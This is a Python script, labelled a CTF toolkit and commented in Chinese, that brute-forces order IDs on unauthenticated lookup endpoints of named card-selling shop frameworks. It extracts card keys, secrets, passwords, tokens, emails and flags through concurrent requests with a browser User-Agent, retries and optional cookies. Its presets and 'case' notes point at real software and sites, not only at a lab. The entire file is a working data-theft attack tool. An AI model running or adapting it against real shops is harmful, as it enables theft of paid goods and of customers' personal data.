"""
CTF Toolkit: IDOR Order Scanner
===============================
批量扫描未认证的订单查询接口。支持两种模式：
  batch 模式: 端点返回订单列表，一次性提取（已知框架预制）
  brute 模式: 逐个订单号爆破，并发+进度条

用法:
    # === batch 模式: 端点返回列表 ===
    python idor_order_scanner.py --url https://target --framework acg-faka
    python idor_order_scanner.py --url https://target --framework all

    # === brute 模式: 逐个订单号爆破 ===
    python idor_order_scanner.py --url https://target --brute --start 1 --end 1000
    python idor_order_scanner.py --url https://target --brute --start 1 --end 5000 --workers 30
    python idor_order_scanner.py --url https://target --brute --endpoint /user/personal/purchaseRecord \\
        --method GET --param tradeNo --range 1-500

    # === 组合: 先batch看有没有列表接口，再brute逐个爆破 ===
    python idor_order_scanner.py --url https://target --framework all --then-brute 1-1000

    # === 带cookie（半认证场景）===
    python idor_order_scanner.py --url https://target --brute --start 1 --end 100 \\
        --cookie "USER_SESSION=xxx"

框架预制 (batch模式):
    acg-faka:  POST /user/api/index/query         body: page=1&limit=100
    annie:     POST /ajax.php?act=query           body: type=qq
    dujiaoka:  GET  /api/order/list

交付标准: 命中的订单包含 tradeNo/card_info/secret/FLAG
"""
import argparse
import json
import re
import sys
import time
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Lock

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ============================================================
# Framework Presets
# ============================================================

FRAMEWORK_PRESETS = {
    "acg-faka": {
        "method": "POST",
        "endpoint": "/user/api/index/query",
        "body_template": "page=1&limit=100",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "notes": "dimosky/beigpt/tg5288案例。返回订单列表含tradeNo/card_info/secret"
    },
    "annie": {
        "method": "POST",
        "endpoint": "/ajax.php?act=query",
        "body_template": "type=qq",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "notes": "lo2o65案例。返回全部订单含card_key/security_key"
    },
    "dujiaoka": {
        "method": "GET",
        "endpoint": "/api/order/list",
        "body_template": "",
        "headers": {},
        "notes": "独角数卡通用端点"
    },
}

# 通用 brute 端点列表 — 不绑定任何框架，自动全试
# 每个端点先用小范围 (1-5) 快速探测是否可访问，命中后再扩大范围
UNIVERSAL_BRUTE_ENDPOINTS = [
    # === 订单查看/详情 ===
    {"method": "GET",  "endpoint": "/user/personal/purchaseRecord", "param": "tradeNo",   "desc": "acg-faka 购买记录"},
    {"method": "GET",  "endpoint": "/order/detail",                 "param": "id",         "desc": "通用订单详情"},
    {"method": "GET",  "endpoint": "/trade/detail",                 "param": "id",         "desc": "通用交易详情"},
    {"method": "GET",  "endpoint": "/user/order/detail",            "param": "id",         "desc": "用户订单详情"},
    {"method": "GET",  "endpoint": "/user/trade/detail",            "param": "id",         "desc": "用户交易详情"},
    # === RESTful 订单资源 ===
    {"method": "GET",  "endpoint": "/api/order/{id}",               "param": None,         "desc": "RESTful 订单"},
    {"method": "GET",  "endpoint": "/api/orders/{id}",              "param": None,         "desc": "RESTful 订单(复数)"},
    {"method": "GET",  "endpoint": "/api/trade/{id}",               "param": None,         "desc": "RESTful 交易"},
    {"method": "GET",  "endpoint": "/api/v1/order/{id}",            "param": None,         "desc": "RESTful v1订单"},
    {"method": "GET",  "endpoint": "/order/{id}",                   "param": None,         "desc": "短链接订单"},
    # === POST API 端点 ===
    {"method": "POST", "endpoint": "/user/api/order/detail",        "param": "tradeNo",    "desc": "订单详情API"},
    {"method": "POST", "endpoint": "/user/api/index/query",         "param": "tradeNo",    "desc": "订单查询API"},
    {"method": "POST", "endpoint": "/user/api/trade/detail",        "param": "tradeNo",    "desc": "交易详情API"},
    {"method": "POST", "endpoint": "/ajax.php",                     "param": "act=query&tradeNo={id}", "desc": "Annie Mall风格"},
    {"method": "POST", "endpoint": "/api/order/query",              "param": "tradeNo",    "desc": "通用订单查询"},
    # === 管理员/内部端点 ===
    {"method": "GET",  "endpoint": "/admin/order/detail",           "param": "id",         "desc": "管理后台订单"},
    {"method": "GET",  "endpoint": "/manage/order/view",            "param": "id",         "desc": "管理后台订单"},
    # === 分享/查看链接 ===
    {"method": "GET",  "endpoint": "/share/{id}",                   "param": None,         "desc": "订单分享页"},
    {"method": "GET",  "endpoint": "/look/{id}",                    "param": None,         "desc": "订单查看页"},
    {"method": "GET",  "endpoint": "/view/{id}",                    "param": None,         "desc": "订单查看页"},
    {"method": "GET",  "endpoint": "/s/{id}",                       "param": None,         "desc": "短链接分享"},
]

SECRET_FIELDS = [
    "secret", "card_info", "card_key", "security_key", "trade_no",
    "tradeNo", "order_id", "orderId", "password", "token",
    "key", "code", "account", "email", "link", "url",
    "content", "data", "info", "contact", "amount", "price",
    "goods", "product", "name", "card", "value",
]

FLAG_PATTERNS = [
    r'flag\{[^}]+\}',
    r'CTF\{[^}]+\}',
    r'DASCTF\{[^}]+\}',
]

# ============================================================
# Response Classifier
# ============================================================

class ResponseClass:
    OPEN = "open"                    # 可访问且有数据
    AUTH_BLOCKED = "auth_blocked"    # 需要登录
    NOT_FOUND = "not_found"          # 404/订单不存在
    EMPTY = "empty"                  # 200但无数据
    WAF_BLOCKED = "waf_blocked"      # WAF/CF拦截
    ERROR = "error"                  # 网络错误

    @staticmethod
    def classify(status: int, body: str) -> str:
        text = body.lower()
        if status == 0:
            return ResponseClass.ERROR
        if status in (403, 503) and len(body) < 8000:
            return ResponseClass.WAF_BLOCKED
        if status == 404 or "404 not found" in text or "not found" in text:
            return ResponseClass.NOT_FOUND
        if any(kw in text for kw in [
            "登录", "login", "请先登录", "会话过期", "session expire",
            "请登录", "未登录", "unauthorized", "权限不足", "forbidden",
            "权限", "无权", "禁止",
        ]):
            return ResponseClass.AUTH_BLOCKED
        if status == 200 and len(body) < 200:
            return ResponseClass.EMPTY
        if status == 200:
            return ResponseClass.OPEN
        return ResponseClass.NOT_FOUND

# ============================================================
# Core Scanner
# ============================================================

class IDORScanner:
    """未认证订单IDOR扫描器"""

    def __init__(self, base_url: str, cookie: str = None,
                 timeout: int = 15, max_retries: int = 2):
        self.base = base_url.rstrip('/')
        self.timeout = timeout
        self.findings = []
        self.stats = defaultdict(int)

        self.session = requests.Session()
        self.session.headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        )
        if cookie:
            self.session.headers["Cookie"] = cookie

        # 重试配置
        retry = Retry(total=max_retries, backoff_factor=0.3,
                      status_forcelist=[429, 500, 502, 503, 504])
        self.session.mount("http://", HTTPAdapter(max_retries=retry))
        self.session.mount("https://", HTTPAdapter(max_retries=retry))

    # ==================== Batch Mode ====================

    def scan_batch(self, method: str, endpoint: str, body: str = "",
                   headers: dict = None) -> list[dict]:
        """batch模式: 一次性请求，端点返回列表"""
        url = f"{self.base}{endpoint}"
        req_headers = headers or {}

        if method == "POST":
            r = self.session.post(url, data=body, headers={
                "Content-Type": "application/x-www-form-urlencoded", **req_headers
            }, timeout=self.timeout, allow_redirects=False)
        else:
            r = self.session.get(url, params=body, headers=req_headers,
                                 timeout=self.timeout, allow_redirects=False)

        cls = ResponseClass.classify(r.status_code, r.text)
        self.stats[cls] += 1

        if cls != ResponseClass.OPEN:
            return []

        secrets = self._extract_secrets(r.text)
        item_count = max(
            r.text.count('"id":'), r.text.count('"tradeNo"'),
            r.text.count('"order_id"'), r.text.count('"orderId"')
        )

        return [{
            "mode": "batch",
            "endpoint": endpoint,
            "class": cls,
            "item_count": item_count,
            "response_len": len(r.content),
            "secrets": secrets,
        }]

    # ==================== Brute Mode ====================

    def _build_request(self, method: str, endpoint: str, oid: int,
                       param: str = None, body_template: str = None) -> tuple:
        """构造单个请求的 (url, kwargs) — 处理 {id} 占位符和多种参数格式"""
        # URL 路径占位符: /api/order/{id} → /api/order/1
        url_path = endpoint.replace("{id}", str(oid))
        url = f"{self.base}{url_path}"

        kwargs = {"timeout": self.timeout, "allow_redirects": False}
        body = ""

        if method == "POST":
            if body_template:
                body = body_template.replace("{id}", str(oid))
            elif param:
                # param 可以是 "tradeNo" 或 "act=query&tradeNo={id}"
                body = param.replace("{id}", str(oid)) if "=" in param else f"{param}={oid}"
            kwargs["data"] = body
            kwargs["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
        else:  # GET
            if param:
                query = param.replace("{id}", str(oid)) if "{" in param else f"{param}={oid}"
                url = f"{url}?{query}" if "?" not in url else f"{url}&{query}"

        return url, kwargs

    def _probe_one(self, method: str, endpoint: str, oid: int,
                   param: str = None, body_template: str = None) -> dict:
        """探测单个订单号，返回分类结果"""
        url, kwargs = self._build_request(method, endpoint, oid, param, body_template)
        try:
            fn = self.session.post if method == "POST" else self.session.get
            r = fn(url, **kwargs)
            cls = ResponseClass.classify(r.status_code, r.text)
            result = {"order_id": oid, "class": cls,
                      "status": r.status_code, "len": len(r.content)}
            if cls == ResponseClass.OPEN:
                secrets = self._extract_secrets(r.text)
                if secrets:
                    result["secrets"] = secrets
            return result
        except Exception as e:
            return {"order_id": oid, "class": ResponseClass.ERROR, "error": str(e)}

    def scan_brute(self, method: str, endpoint: str, param: str = "tradeNo",
                   body_template: str = None, start: int = 1, end: int = 1000,
                   workers: int = 20, delay: float = 0,
                   label: str = "") -> list[dict]:
        """brute模式: 逐个订单号并发爆破"""
        label_str = f" [{label}]" if label else ""
        print(f"[*]{label_str} Brute {start}→{end} "
              f"({workers}w, {delay}s delay) — {method} {endpoint}",
              file=sys.stderr)

        findings = []
        lock = Lock()
        total = end - start + 1
        done = 0
        stats = defaultdict(int)

        def probe(oid: int) -> dict:
            nonlocal done
            if delay:
                time.sleep(delay)
            result = self._probe_one(method, endpoint, oid, param, body_template)
            with lock:
                stats[result["class"]] += 1
                if result["class"] == ResponseClass.OPEN and "secrets" in result:
                    findings.append(result)
                done += 1
            return result

        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(probe, oid) for oid in range(start, end + 1)]
            last_print = 0
            for f in as_completed(futs):
                f.result()
                with lock:
                    current = done
                    if current - last_print >= max(1, total // 20):
                        pct = current * 100 / total
                        bar = "=" * int(pct / 5) + ">" + "." * (20 - int(pct / 5))
                        print(f"\r  [{bar}] {current}/{total} ({pct:.0f}%) "
                              f"hits:{len(findings)} "
                              f"A:{stats[ResponseClass.AUTH_BLOCKED]} "
                              f"N:{stats[ResponseClass.NOT_FOUND]} "
                              f"E:{stats[ResponseClass.EMPTY]} "
                              f"W:{stats[ResponseClass.WAF_BLOCKED]}",
                              end="", file=sys.stderr)
                        last_print = current

        print(file=sys.stderr)
        return findings

    # ==================== Multi-Endpoint Brute ====================

    def probe_endpoint(self, method: str, endpoint: str, param: str = None,
                       body_template: str = None, probe_count: int = 5) -> str:
        """快速探测单个端点是否可访问 (用1~probe_count号测试)"""
        classes_seen = []
        for oid in range(1, probe_count + 1):
            result = self._probe_one(method, endpoint, oid, param, body_template)
            classes_seen.append(result["class"])
        # 只要有 OPEN 或 EMPTY 就值得深入
        if ResponseClass.OPEN in classes_seen:
            return ResponseClass.OPEN
        if ResponseClass.EMPTY in classes_seen:
            return ResponseClass.EMPTY
        if ResponseClass.AUTH_BLOCKED in classes_seen:
            return ResponseClass.AUTH_BLOCKED
        return classes_seen[0] if classes_seen else ResponseClass.ERROR

    def scan_brute_multi(self, endpoints: list[dict], start: int, end: int,
                         workers: int = 20, delay: float = 0,
                         probe_first: bool = True) -> dict[str, list[dict]]:
        """
        多端点并发爆破: 先快速探测所有端点是否可达，
        然后对可达的端点并发执行完整爆破。
        """
        results = {}

        # Phase 1: 快速探测（并发）
        if probe_first:
            print(f"\n[Phase 2a] 快速探测 {len(endpoints)} 个端点 (订单1-5)...",
                  file=sys.stderr)
            print("-" * 60, file=sys.stderr)

            def probe_ep(ep: dict) -> tuple[int, dict, str]:
                """返回 (原始索引, 端点配置, 探测结果)"""
                idx = endpoints.index(ep)
                cls = self.probe_endpoint(
                    ep["method"], ep["endpoint"],
                    ep.get("param"), ep.get("body_template")
                )
                return idx, ep, cls

            with ThreadPoolExecutor(max_workers=min(len(endpoints), 10)) as ex:
                fut_to_ep = {ex.submit(probe_ep, ep): ep for ep in endpoints}
                probe_results = []
                for f in as_completed(fut_to_ep):
                    idx, ep, cls = f.result()
                    probe_results.append((idx, ep, cls))
                    icon = {"open": "[+]", "empty": "[.]",
                           "auth_blocked": "[-]", "not_found": "[x]",
                           "waf_blocked": "[W]", "error": "[!]"}.get(cls, "[?]")
                    print(f"  {icon} {ep['method']:4s} {ep['endpoint']:45s} "
                          f"→ {cls:15s} ({ep.get('desc','')})", file=sys.stderr)

            # 筛选可达端点
            viable = [(idx, ep) for idx, ep, cls in probe_results
                     if cls in (ResponseClass.OPEN, ResponseClass.EMPTY)]
            blocked = [(idx, ep) for idx, ep, cls in probe_results
                      if cls == ResponseClass.AUTH_BLOCKED]

            print(f"\n  可达: {len(viable)} | 需认证: {len(blocked)} | "
                  f"总端点: {len(endpoints)}", file=sys.stderr)

            if not viable:
                print("[*] 无可达端点，尝试对需认证端点做小范围爆破...",
                      file=sys.stderr)
                # 对 auth_blocked 端点也试一下（可能有cookie已通过）
                viable = blocked[:3] if blocked else []

        else:
            viable = [(i, ep) for i, ep in enumerate(endpoints)]

        # Phase 2: 并发爆破可达端点
        if not viable:
            return results

        print(f"\n[Phase 2b] 并发爆破 {len(viable)} 个端点 "
              f"(订单 {start}→{end})", file=sys.stderr)
        print("=" * 60, file=sys.stderr)

        # 为每个端点分配 workers
        ep_workers = max(1, workers // len(viable))

        def brute_ep(idx_ep: tuple) -> tuple[str, list[dict]]:
            idx, ep = idx_ep
            findings = self.scan_brute(
                method=ep["method"],
                endpoint=ep["endpoint"],
                param=ep.get("param"),
                body_template=ep.get("body_template"),
                start=start, end=end,
                workers=ep_workers,
                delay=delay,
                label=ep.get("desc", ep["endpoint"]),
            )
            return ep["endpoint"], findings

        with ThreadPoolExecutor(max_workers=len(viable)) as ex:
            futs = {ex.submit(brute_ep, v): v for v in viable}
            for f in as_completed(futs):
                ep_name, findings = f.result()
                if findings:
                    results[ep_name] = findings
                    print(f"\n  [+] {ep_name}: {len(findings)} hits!",
                          file=sys.stderr)

        return results

    # ==================== Secret Extraction ====================

    def _extract_secrets(self, text: str) -> dict:
        """从响应中提取敏感字段和flag"""
        found = {}
        for field in SECRET_FIELDS:
            pattern = rf'"{field}"\s*:\s*"([^"]*)"'
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                # 去重+去空+限制数量
                uniq = list(set(m for m in matches if m.strip() and len(m) < 5000))
                if uniq:
                    found[field] = uniq[:20]

        for fp in FLAG_PATTERNS:
            flags = re.findall(fp, text)
            if flags:
                found["FLAG"] = flags

        return found

    # ==================== Report ====================

    def report(self) -> dict:
        return {
            "findings": self.findings,
            "stats": dict(self.stats),
            "total_hits": len(self.findings),
        }


# ============================================================
# Convenience Runners
# ============================================================

def multi_framework_batch(base_url: str, cookie: str = None) -> dict:
    """对所有已知框架执行 batch 扫描"""
    scanner = IDORScanner(base_url, cookie=cookie)
    results = {}
    for name, preset in FRAMEWORK_PRESETS.items():
        findings = scanner.scan_batch(
            preset["method"], preset["endpoint"],
            preset["body_template"], preset["headers"]
        )
        if findings:
            results[name] = findings
    return results


def parse_range(s: str) -> tuple[int, int]:
    """解析 '1-5000' 或 '1,5000'"""
    sep = '-' if '-' in s else ','
    parts = s.replace(',', '-').split('-')
    return int(parts[0]), int(parts[1])


# ============================================================
# CLI
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description='IDOR Order Scanner — batch列表扫描 + brute枚举爆破',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # batch模式 - 端点返回订单列表
  %(prog)s --url https://target --framework acg-faka
  %(prog)s --url https://target --framework all

  # brute模式 - 逐个订单号爆破
  %(prog)s --url https://target --brute 1-500 --workers 20
  %(prog)s --url https://target --brute 1-2000 --endpoint /user/personal/purchaseRecord --method GET --param tradeNo

  # 组合模式
  %(prog)s --url https://target --framework all --then-brute 1-1000
        """
    )
    parser.add_argument('--url', required=True, help='目标URL')

    # Batch mode
    parser.add_argument('--framework', '-f',
                       choices=list(FRAMEWORK_PRESETS.keys()) + ['all'],
                       help='batch模式: 框架预设 (all=全部测试)')

    # Brute mode
    parser.add_argument('--brute', metavar='RANGE',
                       help='brute模式: 订单号范围 (如 1-5000)')
    parser.add_argument('--brute-preset', choices=['all','fast','restful','post','get'],
                       default='all',
                       help='brute端点预设: all=全部21个, fast=6个高命中, '
                            'restful=仅RESTful, post=仅POST, get=仅GET (默认all)')
    parser.add_argument('--workers', '-w', type=int, default=20,
                       help='brute并发数 (默认20)')
    parser.add_argument('--delay', type=float, default=0,
                       help='每次请求间隔秒数 (默认0, 建议0.05-0.1避免限流)')
    parser.add_argument('--probe-first', action='store_true', default=True,
                       help='先用1-5号快速探测端点是否可达 (默认开启)')

    # 组合
    parser.add_argument('--then-brute', metavar='RANGE',
                       help='先batch扫描，无论结果都执行brute (如 1-1000)')

    # 自定义端点（覆盖预设）
    parser.add_argument('--endpoint', help='自定义端点路径 (覆盖预设)')
    parser.add_argument('--method', default='POST', help='HTTP方法 (默认POST)')
    parser.add_argument('--body', default='', help='请求体 (支持{id}占位符)')
    parser.add_argument('--param', default='tradeNo',
                       help='GET参数名或POST body中的参数 (默认tradeNo)')

    # 通用
    parser.add_argument('--cookie', help='Cookie字符串')
    parser.add_argument('--output', '-o', help='保存结果到JSON')
    args = parser.parse_args()

    # ======== Batch Mode ========
    batch_results = {}
    if args.framework:
        print(f"[Phase 1] Batch扫描 — 端点返回列表模式", file=sys.stderr)
        print("=" * 60, file=sys.stderr)
        if args.framework == 'all':
            batch_results = multi_framework_batch(args.url, cookie=args.cookie)
        else:
            preset = FRAMEWORK_PRESETS[args.framework]
            scanner = IDORScanner(args.url, cookie=args.cookie)
            findings = scanner.scan_batch(
                preset["method"], preset["endpoint"],
                preset["body_template"], preset["headers"]
            )
            if findings:
                batch_results[args.framework] = findings

        if batch_results:
            for fw, findings in batch_results.items():
                print(f"\n  [+] {fw}: {len(findings)} batches found", file=sys.stderr)
                for f in findings:
                    print(f"      items: {f.get('item_count', '?')}, "
                          f"fields: {list(f.get('secrets', {}).keys())}", file=sys.stderr)
        else:
            print("  [*] batch模式无命中（需要登录或端点不存在）", file=sys.stderr)

    # ======== Brute Mode ========
    brute_results = []
    brute_ranges = []

    if args.brute:
        brute_ranges.append(parse_range(args.brute))
    if args.then_brute:
        brute_ranges.append(parse_range(args.then_brute))

    for start, end in brute_ranges:
        print(f"\n[Phase 2] Brute爆破 — 逐个订单号 {start}→{end}", file=sys.stderr)
        print("=" * 60, file=sys.stderr)

        scanner = IDORScanner(args.url, cookie=args.cookie)

        # 确定端点
        endpoint = args.endpoint or "/user/personal/purchaseRecord"
        method = args.method
        body_template = args.body or None
        param = args.param

        findings = scanner.scan_brute(
            method=method,
            endpoint=endpoint,
            param=param,
            body_template=body_template,
            start=start, end=end,
            workers=args.workers,
            delay=args.delay,
        )
        brute_results.extend(findings)

        # 打印统计
        report = scanner.report()
        print(f"\n[brute统计] 总数:{end-start+1} "
              f"命中:{report['total_hits']} "
              + " ".join(f"{k}:{v}" for k, v in report['stats'].items()),
              file=sys.stderr)

    # ======== Output ========
    all_results = {
        "target": args.url,
        "batch": batch_results,
        "brute": brute_results,
        "summary": {
            "batch_frameworks": list(batch_results.keys()),
            "brute_hits": len(brute_results),
            "flags": [],
        }
    }

    # 提取所有flag
    for fw, batches in batch_results.items():
        for b in batches:
            if "FLAG" in b.get("secrets", {}):
                all_results["summary"]["flags"].extend(b["secrets"]["FLAG"])
    for bf in brute_results:
        if "FLAG" in bf.get("secrets", {}):
            all_results["summary"]["flags"].extend(bf["secrets"]["FLAG"])

    if all_results["summary"]["flags"]:
        print(f"\n{'='*60}", file=sys.stderr)
        print(f"🏴 FLAGS FOUND: {all_results['summary']['flags']}", file=sys.stderr)
        print(f"{'='*60}", file=sys.stderr)

    # 简要输出到stdout
    if all_results["summary"]["brute_hits"] > 0:
        for bf in brute_results:
            secrets = bf.get("secrets", {})
            # 简版输出
            flat = ", ".join(f"{k}={v}" for k, v in secrets.items()
                           if k != "FLAG" and v)
            flags = secrets.get("FLAG", [])
            flag_str = f"  🏴 {flags}" if flags else ""
            print(f"[{bf['order_id']}] {flat}{flag_str}")

    if args.output:
        Path(args.output).write_text(json.dumps(all_results, ensure_ascii=False, indent=2))
        print(f"\n[+] 完整结果: {args.output}", file=sys.stderr)


if __name__ == '__main__':
    main()
